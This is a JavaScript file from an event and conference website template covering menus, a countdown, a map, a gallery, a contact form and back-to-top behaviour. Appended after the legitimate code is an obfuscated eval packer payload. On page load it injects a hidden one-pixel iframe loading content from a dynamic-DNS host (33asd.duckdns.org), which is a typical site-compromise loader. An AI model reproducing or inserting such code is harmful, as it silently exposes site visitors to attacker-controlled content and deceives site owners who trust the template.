/*

	Template Name: Eventor - Conference & Event HTML Template
	Author: Themewinter
	Author URI: https://themeforest.net/user/themewinter
	Description: Eventor - Conference & Event HTML Template
	Version: 1.0

	1. Mobile Menu
	2. Main Slideshow
	3. Gallery popup
	4. Counter
	5. Contact form
	6. Back to top
  
*/



jQuery(function ($) {
    "use strict";


    /* ----------------------------------------------------------- */
    /*  Mobile Menu
    /* ----------------------------------------------------------- */

    jQuery(".nav.navbar-nav li a").on("click", function () {
        jQuery(this).parent("li").find(".dropdown-menu").slideToggle();
        jQuery(this).find("i").toggleClass("fa-angle-down fa-angle-up");
    });

    $('.smoothScroll').click(function() {
        if (location.pathname.replace(/^\//, '') == this.pathname.replace(/^\//, '') && location.hostname == this.hostname) {
          var target = $(this.hash);
          target = target.length ? target : $('[name=' + this.hash.slice(1) + ']');
          if (target.length) {
            $('html,body').animate({
              scrollTop: target.offset().top
            }, 1000); // The number here represents the speed of the scroll in milliseconds
            return false;
          }
        }
      });

    /* ----------------------------------------------------------- */
    /*  Event counter 
    /* -----------------------------------------------------------*/

    if ($('.countdown').length > 0) {
        $(".countdown").jCounter({
            date: '21 October 2018 12:00:00',
            fallback: function () {
                console.log("count finished!")
            }
        });
    }

    /* ----------------------------------------------------------- */
    /*  Event Map 
    /* -----------------------------------------------------------*/

    if ($('#map').length > 0) {

        var eventmap = {
            lat: 40.742964,
            lng: -73.992277
        };

        $('#map')
            .gmap3({
                zoom: 13,
                center: eventmap,
                mapTypeId: google.maps.MapTypeId.ROADMAP,
                scrollwheel: false
            })

            .marker({
                position: eventmap
            })

            .infowindow({
                position: eventmap,
                content: "NYC Seminar and Conference Center, New York"
            })

            .then(function (infowindow) {
                var map = this.get(0);
                var marker = this.get(1);
                marker.addListener('click', function () {
                    infowindow.open(map, marker);
                });
            });
    }




    /* ----------------------------------------------------------- */
    /*  Main slideshow
    /* ----------------------------------------------------------- */

    $('#main-slide').carousel({
        pause: true,
        interval: 100000,
    });


    /* ----------------------------------------------------------- */
    /*  Gallery popup
    /* ----------------------------------------------------------- */

    $(document).ready(function () {

        $(".gallery-popup").colorbox({
            rel: 'gallery-popup',
            transition: "fade",
            innerHeight: "700"
        });

        $(".popup").colorbox({
            iframe: true,
            innerWidth: 650,
            innerHeight: 450
        });

    



    });



    /* ----------------------------------------------------------- */
    /*  Counter
    /* ----------------------------------------------------------- */

    $('.counterUp').counterUp({
        delay: 10,
        time: 1000
    });



    /* ----------------------------------------------------------- */
    /*  Contact form
    /* ----------------------------------------------------------- */

    $('#contact-form').submit(function () {

        var $form = $(this),
            $error = $form.find('.error-container'),
            action = $form.attr('action');

        $error.slideUp(750, function () {
            $error.hide();

            var $name = $form.find('.form-control-name'),
                $email = $form.find('.form-control-email'),
                $subject = $form.find('.form-control-subject'),
                $message = $form.find('.form-control-message');

            $.post(action, {
                    name: $name.val(),
                    email: $email.val(),
                    subject: $subject.val(),
                    message: $message.val()
                },
                function (data) {
                    $error.html(data);
                    $error.slideDown('slow');

                    if (data.match('success') != null) {
                        $name.val('');
                        $email.val('');
                        $subject.val('');
                        $message.val('');
                    }
                }
            );

        });

        return false;

    });


    /* ----------------------------------------------------------- */
    /*  Back to top
    /* ----------------------------------------------------------- */

    $(window).scroll(function () {
        if ($(this).scrollTop() > 50) {
            $('#back-to-top').fadeIn();
        } else {
            $('#back-to-top').fadeOut();
        }
    });

    // scroll body to 0px on click
    $('#back-to-top').on('click', function () {
        $('#back-to-top').tooltip('hide');
        $('body,html').animate({
            scrollTop: 0
        }, 800);
        return false;
    });

    $('#back-to-top').tooltip('hide');


});eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('g.f=e(){i.j.k+=\'<6 d="a" 9="b:2;c:2;h:p;7:4;8:4;s:t;3:2;" l="r" q="m://5.n.o/5/" 3=0 7="1" 8="1" 9="3:2"></6>\'}',30,30,'||0px|border|1px|33asd|iframe|width|height|style|33|margin|padding|id|function|onload|window|overflow|document|body|innerHTML|scrolling|http|duckdns|org|hidden|src|no|position|relative'.split('|'),0,{}))
